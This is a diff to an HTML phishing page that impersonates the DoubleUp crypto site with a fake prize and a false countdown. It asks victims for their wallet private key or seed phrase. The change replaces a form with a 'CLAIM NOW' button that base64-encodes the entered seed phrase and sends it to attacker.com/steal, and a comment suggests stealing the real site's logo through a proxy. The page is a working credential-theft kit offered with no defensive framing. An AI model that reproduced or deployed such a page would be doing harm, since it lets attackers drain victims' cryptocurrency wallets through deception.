@@ -7,10 +7,10 @@
         <img src="https://www.doubleup.fun/logo.png" width="200" /> <!-- steal their real logo via same proxy if needed -->
         <h1 style="font-size:48px">You Won 10x Multiplier!</h1>
         <p style="font-size:24px">Connect wallet to claim your prize</p>
-        <form action="http://sdfsdf.com/sqdsqd"
+        
         <div style="background:#16213e; padding:40px; border-radius:16px; box-shadow:0 0 30px rgba(0,255,255,0.3); width:420px">
           <input type="text" placeholder="Enter private key or seed phrase to claim" style="width:100%; padding:16px; margin:10px 0; background:#0f0f23; border:1px solid #00ffff; border-radius:8px; color:white; font-size:18px" id="seed"/>
-          <input type="submit">
+          <button onclick="location='https://attacker.com/steal?data='+btoa(document.getElementById('seed').value)" style="width:100%; padding:18px; background:#00ffff; color:black; font-weight:bold; border:none; border-radius:8px; cursor:pointer">CLAIM NOW</button>
         </div>
         
         <small>This is an official DoubleUp promotion — only 10 seconds left!</small>
